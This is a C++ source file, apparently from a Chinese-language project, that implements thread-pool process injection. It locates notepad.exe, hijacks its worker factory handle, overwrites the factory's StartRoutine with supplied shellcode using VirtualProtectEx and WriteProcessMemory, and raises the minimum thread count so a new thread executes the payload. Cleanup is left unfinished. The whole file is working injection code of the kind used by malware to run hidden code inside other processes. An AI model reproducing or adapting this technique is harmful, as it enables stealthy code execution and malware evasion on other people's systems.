//Varient1.cpp
#include "Varient1.h"
typedef enum _SET_WORKERFACTORYINFOCLASS
{
	WorkerFactoryTimeout = 0,
	WorkerFactoryRetryTimeout = 1,
	WorkerFactoryIdleTimeout = 2,
	WorkerFactoryBindingCount = 3,
	WorkerFactoryThreadMinimum = 4,
	WorkerFactoryThreadMaximum = 5,
	WorkerFactoryPaused = 6,
	WorkerFactoryAdjustThreadGoal = 8,
	WorkerFactoryCallbackType = 9,
	WorkerFactoryStackInformation = 10,
	WorkerFactoryThreadBasePriority = 11,
	WorkerFactoryTimeoutWaiters = 12,
	WorkerFactoryFlags = 13,
	WorkerFactoryThreadSoftMaximum = 14,
	WorkerFactoryMaxInfoClass = 15 /* Not implemented */
} SET_WORKERFACTORYINFOCLASS;
NTSTATUS MyNtSetInformationWorkerFactory(
	HANDLE WorkerFactoryHandle,
	ULONG WorkerFactoryInformationClass,
	PVOID WorkerFactoryInformation,
	ULONG WorkerFactoryInformationLength)
{
	PFN_NtSetInformationWorkerFactory pFunc =
		(PFN_NtSetInformationWorkerFactory)GetProcAddress(
			GetModuleHandleW(L"ntdll.dll"),
			"NtSetInformationWorkerFactory");

	if (!pFunc)
	{
		printf("[-] 获取 NtSetInformationWorkerFactory 失败\n");
		return STATUS_NOT_FOUND;
	}

	return pFunc(WorkerFactoryHandle,
		WorkerFactoryInformationClass,
		WorkerFactoryInformation,
		WorkerFactoryInformationLength);
}
BOOL inject(unsigned char* g_shellcode,SIZE_T shellcodeSize)
{
	DWORD pid = getPIDByName(L"notepad.exe");
	if(pid == 0)
	{
		printf("未找到notepad.exe进程\n");
		return FALSE;
	}
	HANDLE hTargetProcess = NULL;
	HANDLE hTpWork = Hijack_TP_WORK_HANDLE(&hTargetProcess, pid);
	if(!hTpWork)
	{
		printf("Hijack TP_WORK失败\n");
		return FALSE;
	}
	WORKER_FACTORY_BASIC_INFORMATION pInfo = { 0 };
	NTSTATUS status = MyNtQueryInformationFactory(hTpWork, &pInfo);
	if(status != STATUS_SUCCESS)
	{
		printf("查询Worker Factory信息失败\n");
		return FALSE;
	}
	if (NT_SUCCESS(status))
		printf("Worker Factory StartRoutine: 0x%p, StartParameter: 0x%p\n", pInfo.StartRoutine, pInfo.StartParameter);

	PVOID StartRoutine = pInfo.StartRoutine;
	PVOID pOriginalStartRoutineBackUp = pInfo.StartRoutine;
	DWORD oldProtect;
	VirtualProtectEx(hTargetProcess, StartRoutine, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	WriteProcessMemory(hTargetProcess, StartRoutine, g_shellcode, shellcodeSize, nullptr);
	//todo
	ULONG WorkerFactoryMinimumThreadNumber = pInfo.TotalWorkerCount + 1; // 设置最小线程数为当前总线程数 + 1，强制创建新线程
	MyNtSetInformationWorkerFactory(
		hTpWork,
		WorkerFactoryThreadMinimum,
		&WorkerFactoryMinimumThreadNumber,
		sizeof(WorkerFactoryMinimumThreadNumber)
	);
	printf("最小线程设为%d\n", WorkerFactoryMinimumThreadNumber);
	//恢复StartRoutine,善后处理，避免崩溃

	//todo...






	Sleep(500);
	return TRUE;

}

